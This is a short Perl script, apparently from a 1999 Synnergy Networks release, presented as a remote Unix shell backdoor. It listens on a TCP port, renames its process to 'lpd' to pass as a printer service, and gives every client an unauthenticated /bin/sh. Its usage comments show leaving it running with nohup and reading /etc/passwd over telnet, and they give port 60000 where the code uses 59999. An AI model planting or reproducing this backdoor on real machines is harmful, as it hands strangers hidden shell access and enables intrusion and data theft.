#!/usr/bin/perl
# *** Synnergy Networks

# * Description:
#
# Remote unix shell backdoor.

# * Author:
#
# headflux (hf@synnergy.net)
# Synnergy Networks (c) 1999,  http://www.synnergy.net

# * Usage:
# remote.com$ ./nohup bindshell.pl &
# remote.com$ exit
# Connection closed by foreign host
# localhost$ telnet remote.com 60000
# Trying 192.168.1.1...
# Connected to remote.com.
# Escape character is '^]'.
# (user@remote.com:/home/user/)
# cat /etc/passwd; etc

# *** Synnergy Networks

use Socket;

$port	= 59999;
$proto	= getprotobyname('tcp');
$cmd	= "lpd";
$system	= 'echo "(`whoami`@`uname -n`:`pwd`)"; /bin/sh';

$0 = $cmd;

socket(SERVER, PF_INET, SOCK_STREAM, $proto)
					or die "socket:$!";
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack("l", 1))
					or die "setsockopt: $!";
bind(SERVER, sockaddr_in($port, INADDR_ANY))
					or die "bind: $!";
listen(SERVER, SOMAXCONN)		or die "listen: $!";

for(; $paddr = accept(CLIENT, SERVER); close CLIENT)
{
	open(STDIN, ">&CLIENT");
	open(STDOUT, ">&CLIENT");
	open(STDERR, ">&CLIENT");

	system($system);

	close(STDIN);
	close(STDOUT);
	close(STDERR);
} 


